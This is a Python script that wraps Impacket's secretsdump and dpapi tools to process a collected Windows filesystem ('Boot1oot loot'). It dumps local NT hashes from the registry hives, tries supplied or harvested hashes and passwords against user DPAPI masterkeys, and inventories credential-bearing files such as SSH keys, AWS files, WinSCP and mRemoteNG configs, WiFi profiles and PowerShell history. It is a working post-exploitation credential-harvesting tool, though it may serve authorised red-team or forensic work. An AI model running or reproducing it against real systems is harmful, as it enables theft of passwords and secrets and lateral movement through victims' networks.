#!/usr/bin/env python3
from __future__ import annotations

import argparse
import re
import shutil
import subprocess
import sys
from pathlib import Path
from typing import List, Optional, Sequence, Tuple


HashPair = Tuple[str, str]

EMPTY_NT_HASH = "31d6cfe0d16ae931b73c59d7e0c089c0"
HASH_RE = re.compile(
    r"^(?P<user>[^:\s][^:]*):(?P<rid>\d+):(?P<LM>[0-9a-fA-F]{32}):"
    r"(?P<NT>[0-9a-fA-F]{32}):::"
)
SID_RE = re.compile(r"^S-\d-\d+(?:-\d+)+$")
GUID_RE = re.compile(
    r"^[0-9a-fA-F]{8}-[0-9a-fA-F]{4}-[0-9a-fA-F]{4}-"
    r"[0-9a-fA-F]{4}-[0-9a-fA-F]{12}$"
)

SECRET_FLAG_VALUES = {"--password", "--hash", "-key"}
HIVE_NAMES = ("SAM", "SYSTEM", "SECURITY", "SOFTWARE", "DEFAULT")

COLOR_RED = "\033[31m"
COLOR_GREEN = "\033[32m"
COLOR_BLUE = "\033[34m"
COLOR_RESET = "\033[0m"

NOTABLE_PATTERNS = (
    ("PowerShell history", "Users/*/AppData/*/Microsoft/Windows/PowerShell/PSReadLine/*"),
    (
        "Notepad tab state",
        "Users/*/AppData/Local/Packages/"
        "Microsoft.WindowsNotepad_8wekyb3d8bbwe/LocalState/TabState/*",
    ),
    ("Notepad++ backups", "Users/*/AppData/Roaming/Notepad++/backup/*"),
    ("Recent links", "Users/*/AppData/Roaming/Microsoft/Windows/Recent/*"),
    ("WinSCP config", "Users/*/AppData/Roaming/WinSCP.ini"),
    ("WinSCP config", "Users/*/Documents/WinSCP.ini"),
    ("mRemoteNG config", "Users/*/AppData/*/mRemoteNG/*"),
    ("MobaXterm config", "Users/*/AppData/*/MobaXterm/*"),
    ("MobaXterm documents", "Users/*/Documents/MobaXterm/*"),
    ("AWS files", "Users/*/.aws/*"),
    ("SSH files", "Users/*/.ssh/*"),
    ("WiFi profiles", "ProgramData/Microsoft/Wlansvc/Profiles/Interfaces/*/*"),
    ("IIS config", "Windows/System32/inetsrv/config/*"),
    ("UltraVNC config", "Program Files*/**/ultravnc.ini"),
)


def main() -> int:
    args = build_parser().parse_args()
    loot_root = args.loot.resolve()
    windows_root = resolve_windows_root(loot_root)
    output_dir = args.output.resolve() if args.output else None
    if output_dir:
        output_dir.mkdir(parents=True, exist_ok=True)

    secretsdump = find_tool(("secretsdump.py", "impacket-secretsdump"))
    dpapi = find_tool(("dpapi.py", "impacket-dpapi"))

    print_context(loot_root, windows_root, output_dir, secretsdump, dpapi)
    if not confirm_missing_dependencies(secretsdump, dpapi):
        warn("exiting because required wrapper dependencies are missing")
        return 1

    show_inventory(windows_root)
    show_notable_files(windows_root)

    hashes: List[HashPair] = []
    if secretsdump:
        hashes = run_secretsdump(secretsdump, windows_root, output_dir)
    else:
        warn("secretsdump.py was not found; skipping SAM/LSA extraction")

    if dpapi:
        run_dpapi(
            dpapi,
            windows_root,
            output_dir,
            args.password,
            args.hash,
            hashes,
            args.try_all,
        )
    else:
        warn("dpapi.py was not found; skipping DPAPI wrapper commands")

    return 0


def build_parser() -> argparse.ArgumentParser:
    parser = argparse.ArgumentParser(
        description=(
            "Example wrapper for Impacket secretsdump.py and dpapi.py "
            "against Boot1oot loot."
        )
    )
    parser.add_argument(
        "loot",
        type=Path,
        help="Boot1oot loot directory or extracted fallback archive",
    )
    parser.add_argument(
        "-o",
        "--output",
        type=Path,
        help="optional directory for raw command transcripts",
    )
    parser.add_argument(
        "--password",
        action="append",
        default=[],
        help="password to try against user DPAPI masterkeys",
    )
    parser.add_argument(
        "--hash",
        action="append",
        default=[],
        help="NT hash to try against user DPAPI masterkeys",
    )
    parser.add_argument(
        "--try-all",
        action="store_true",
        help="try every local NT hash parsed from secretsdump against every user DPAPI masterkey",
    )
    return parser


def resolve_windows_root(root: Path) -> Path:
    if (root / "windows" / "Windows" / "System32" / "config").is_dir():
        return root / "windows"
    if (root / "Windows" / "System32" / "config").is_dir():
        return root
    raise SystemExit(f"loot root does not contain a collected Windows tree: {root}")


def find_tool(names: Sequence[str]) -> Optional[str]:
    for name in names:
        found = shutil.which(name)
        if found:
            return found
    return None


def print_context(
    loot_root: Path,
    windows_root: Path,
    output_dir: Optional[Path],
    secretsdump: Optional[str],
    dpapi: Optional[str],
) -> None:
    info(f"loot root: {loot_root}")
    info(f"windows root: {windows_root}")
    if output_dir:
        info(f"raw transcripts: {output_dir}")
    info(f"secretsdump: {secretsdump or 'not found'}")
    info(f"dpapi: {dpapi or 'not found'}")


def confirm_missing_dependencies(secretsdump: Optional[str], dpapi: Optional[str]) -> bool:
    missing = []
    if not secretsdump:
        missing.append("secretsdump.py / impacket-secretsdump")
    if not dpapi:
        missing.append("dpapi.py / impacket-dpapi")
    if not missing:
        return True

    warn("missing dependency: " + ", ".join(missing))
    warn("install Impacket example tools, for example: sudo apt install -y impacket-scripts")
    if not sys.stdin.isatty():
        warn("stdin is not interactive; cannot prompt")
        return False

    prompt = color_prefix(COLOR_BLUE, "[*] ") + "continue with missing dependencies? [y/N] "
    try:
        answer = input(prompt)
    except EOFError:
        warn("stdin closed before a response was provided")
        return False
    return answer.strip().lower() in {"y", "yes"}


def run_secretsdump(
    tool: str,
    windows_root: Path,
    output_dir: Optional[Path],
) -> List[HashPair]:
    sam = windows_root / "Windows/System32/config/SAM"
    system = windows_root / "Windows/System32/config/SYSTEM"
    security = windows_root / "Windows/System32/config/SECURITY"

    if not sam.is_file() or not system.is_file():
        warn("secretsdump skipped; SAM or SYSTEM hive is missing")
        return []

    cmd = [tool, "-sam", str(sam), "-system", str(system)]
    if security.is_file():
        cmd.extend(["-security", str(security)])
    else:
        warn("SECURITY hive missing; secretsdump will run with SAM/SYSTEM only")
    cmd.append("LOCAL")

    output = run_command("secretsdump", cmd, output_dir)
    hashes = parse_hashes(output)
    if hashes:
        ok(f"parsed {len(hashes)} local NT hash(es) from secretsdump output")
    else:
        warn("no local NT hashes parsed from secretsdump output")
    return hashes


def run_dpapi(
    tool: str,
    windows_root: Path,
    output_dir: Optional[Path],
    passwords: Sequence[str],
    hashes: Sequence[str],
    parsed_hashes: Sequence[HashPair],
    try_all: bool,
) -> None:
    credential_files = list_credential_files(windows_root)
    vault_policy_files = list_files(windows_root, "Users/*/AppData/*/Microsoft/Vault/*/*.vpol")
    vault_credential_files = list_files(windows_root, "Users/*/AppData/*/Microsoft/Vault/*/*.vcrd")
    masterkeys = list_masterkeys(windows_root)

    run_dpapi_file_inspection(
        tool,
        windows_root,
        output_dir,
        "DPAPI credential blobs",
        "dpapi-credential-inspect",
        credential_files,
        ("credential", "-file"),
    )
    run_dpapi_file_inspection(
        tool,
        windows_root,
        output_dir,
        "DPAPI vault policy files",
        "dpapi-vault-policy-inspect",
        vault_policy_files,
        ("vault", "-vpol"),
    )
    show_path_group(windows_root, "DPAPI vault credential files", "Vault credential", vault_credential_files)

    run_system_masterkeys(tool, windows_root, output_dir, masterkeys)
    run_user_masterkeys(
        tool,
        windows_root,
        output_dir,
        masterkeys,
        passwords,
        hashes,
        parsed_hashes,
        try_all,
    )


def run_dpapi_file_inspection(
    tool: str,
    windows_root: Path,
    output_dir: Optional[Path],
    label: str,
    command_name: str,
    paths: Sequence[Path],
    dpapi_args: Sequence[str],
) -> None:
    if not paths:
        skip(f"{label}: none found")
        return

    info(f"{label}: {len(paths)}")
    for path in paths:
        run_command(
            f"{command_name}-{safe_name(path.relative_to(windows_root))}",
            [tool, dpapi_args[0], dpapi_args[1], str(path)],
            output_dir,
        )


def run_system_masterkeys(
    tool: str,
    windows_root: Path,
    output_dir: Optional[Path],
    masterkeys: Sequence[Tuple[Optional[str], Path]],
) -> None:
    system = windows_root / "Windows/System32/config/SYSTEM"
    security = windows_root / "Windows/System32/config/SECURITY"
    system_masterkeys = [path for _, path in masterkeys if "systemprofile" in path.parts]

    if not system_masterkeys:
        skip("system DPAPI masterkeys: none found")
        return
    if not system.is_file() or not security.is_file():
        warn("system DPAPI masterkeys found, but SYSTEM or SECURITY hive is missing")
        return

    info(f"system DPAPI masterkeys: {len(system_masterkeys)}")
    for path in system_masterkeys:
        run_command(
            f"dpapi-system-masterkey-{safe_name(path.relative_to(windows_root))}",
            [tool, "masterkey", "-file", str(path), "-system", str(system), "-security", str(security)],
            output_dir,
        )


def run_user_masterkeys(
    tool: str,
    windows_root: Path,
    output_dir: Optional[Path],
    masterkeys: Sequence[Tuple[Optional[str], Path]],
    passwords: Sequence[str],
    hashes: Sequence[str],
    parsed_hashes: Sequence[HashPair],
    try_all: bool,
) -> None:
    user_masterkeys = [(sid, path) for sid, path in masterkeys if "systemprofile" not in path.parts]
    if not user_masterkeys:
        skip("user DPAPI masterkeys: none found")
        return

    info(f"user DPAPI masterkeys: {len(user_masterkeys)}")
    if not passwords and not hashes and not try_all:
        info("user masterkeys were not tried; pass --password, --hash, or --try-all")

    for sid, path in user_masterkeys:
        if not sid:
            warn(f"masterkey has no SID parent: {path.relative_to(windows_root)}")
            continue
        for password in passwords:
            run_command(
                f"dpapi-user-masterkey-password-{safe_name(path.relative_to(windows_root))}",
                [tool, "masterkey", "-file", str(path), "-sid", sid, "-password", password],
                output_dir,
            )
        for nthash in hashes:
            run_command(
                f"dpapi-user-masterkey-hash-{safe_name(path.relative_to(windows_root))}",
                [tool, "masterkey", "-file", str(path), "-sid", sid, "-key", "0x" + normalize_hash(nthash)],
                output_dir,
            )
        if try_all:
            for user, nthash in parsed_hashes:
                run_command(
                    f"dpapi-user-masterkey-tryall-{safe_name(user)}-{safe_name(path.relative_to(windows_root))}",
                    [tool, "masterkey", "-file", str(path), "-sid", sid, "-key", "0x" + nthash],
                    output_dir,
                )


def run_command(name: str, command: Sequence[str], output_dir: Optional[Path]) -> str:
    display = mask_command(command)
    header = f"$ {' '.join(display)}"
    print()
    print("=" * 80)
    print(f"{color_prefix(COLOR_BLUE, '[*] ')}{name}")
    print(header)
    print("-" * 80)

    try:
        proc = subprocess.run(
            list(command),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
            encoding="utf-8",
            errors="replace",
            check=False,
        )
    except OSError as exc:
        output = f"exec failed: {exc}\n"
        print(output, end="")
        write_transcript(output_dir, name, header, output)
        return output

    output = proc.stdout
    if proc.stderr:
        output += ("\n" if output else "") + proc.stderr
    print(output, end="" if output.endswith("\n") or not output else "\n")
    print(f"{color_prefix(COLOR_BLUE, '[*] ')}exit code: {proc.returncode}")

    transcript = output + f"\n[*] exit code: {proc.returncode}\n"
    write_transcript(output_dir, name, header, transcript)
    return output


def write_transcript(output_dir: Optional[Path], name: str, header: str, output: str) -> None:
    if not output_dir:
        return
    path = output_dir / f"{safe_name(name)}.txt"
    with path.open("w", encoding="utf-8", errors="replace") as fp:
        fp.write(header + "\n\n")
        fp.write(output)


def show_inventory(windows_root: Path) -> None:
    present = [
        name
        for name in HIVE_NAMES
        if (windows_root / "Windows/System32/config" / name).is_file()
    ]
    missing = [name for name in HIVE_NAMES if name not in present]
    info("registry hives present: " + (", ".join(present) if present else "none"))
    if missing:
        warn("registry hives missing: " + ", ".join(missing))

    users = windows_root / "Users"
    user_count = len([path for path in users.iterdir() if path.is_dir()]) if users.is_dir() else 0
    info(f"user profile directories: {user_count}")
    info(f"DPAPI masterkeys: {len(list_masterkeys(windows_root))}")
    info(f"DPAPI credential blobs: {len(list_credential_files(windows_root))}")


def show_notable_files(windows_root: Path) -> None:
    for label, pattern in NOTABLE_PATTERNS:
        paths = list_files(windows_root, pattern)
        if not paths:
            continue
        info(f"{label}: {len(paths)} file(s)")
        for path in paths[:25]:
            notice_path(windows_root, label, path)
        if len(paths) > 25:
            info(f"{label}: {len(paths) - 25} more path(s) not printed")


def show_path_group(windows_root: Path, group: str, item_label: str, paths: Sequence[Path]) -> None:
    if not paths:
        skip(f"{group}: none found")
        return
    info(f"{group}: {len(paths)}")
    for path in paths:
        notice_path(windows_root, item_label, path)


def list_masterkeys(windows_root: Path) -> List[Tuple[Optional[str], Path]]:
    found: List[Tuple[Optional[str], Path]] = []
    for base in (windows_root / "Users", windows_root / "Windows/System32/config/systemprofile"):
        if not base.exists():
            continue
        for path in base.glob("**/Microsoft/Protect/*/*"):
            if not path.is_file() or not GUID_RE.match(path.name):
                continue
            sid = path.parent.name if SID_RE.match(path.parent.name) else None
            found.append((sid, path))
    return sorted(found, key=lambda item: str(item[1]).lower())


def list_credential_files(windows_root: Path) -> List[Path]:
    patterns = (
        "Users/*/AppData/*/Microsoft/Credentials/*",
        "Windows/System32/config/systemprofile/AppData/*/Microsoft/Credentials/*",
    )
    paths: List[Path] = []
    for pattern in patterns:
        paths.extend(list_files(windows_root, pattern))
    return sorted(paths, key=lambda path: str(path).lower())


def list_files(root: Path, pattern: str) -> List[Path]:
    return sorted((path for path in root.glob(pattern) if path.is_file()), key=lambda path: str(path).lower())


def parse_hashes(output: str) -> List[HashPair]:
    hashes: List[HashPair] = []
    seen = set()
    for line in output.splitlines():
        match = HASH_RE.match(line.strip())
        if not match:
            continue
        user = match.group("user")
        nthash = match.group("NT").lower()
        if nthash == EMPTY_NT_HASH:
            continue
        key = (user, nthash)
        if key not in seen:
            seen.add(key)
            hashes.append(key)
    return hashes


def normalize_hash(value: str) -> str:
    value = value.strip()
    if ":" in value:
        value = value.split(":")[-1]
    value = value.removeprefix("0x").removeprefix("0X")
    if not re.fullmatch(r"[0-9a-fA-F]{32}", value):
        warn(f"hash does not look like a 32-character NT hash: {value}")
    return value.lower()


def mask_command(command: Sequence[str]) -> List[str]:
    masked: List[str] = []
    hide_next = False
    for item in command:
        if hide_next:
            masked.append("<redacted>")
            hide_next = False
            continue
        masked.append(item)
        if item in SECRET_FLAG_VALUES:
            hide_next = True
    return masked


def safe_name(value: object) -> str:
    cleaned = re.sub(r"[^A-Za-z0-9_.-]+", "_", str(value)).strip("._")
    return cleaned[:180] or "output"


def notice_path(root: Path, label: str, path: Path) -> None:
    try:
        shown = path.relative_to(root)
    except ValueError:
        shown = path
    print(f"    {label} found: {shown}")


def info(message: str) -> None:
    print(f"{color_prefix(COLOR_BLUE, '[*] ')}{message}")


def ok(message: str) -> None:
    print(f"{color_prefix(COLOR_GREEN, '[+] ')}{message}")


def warn(message: str) -> None:
    print(f"{color_prefix(COLOR_RED, '[!] ')}{message}")


def skip(message: str) -> None:
    print(f"[-] {message}")


def color_prefix(color: str, prefix: str) -> str:
    return f"{color}{prefix}{COLOR_RESET}"


if __name__ == "__main__":
    raise SystemExit(main())
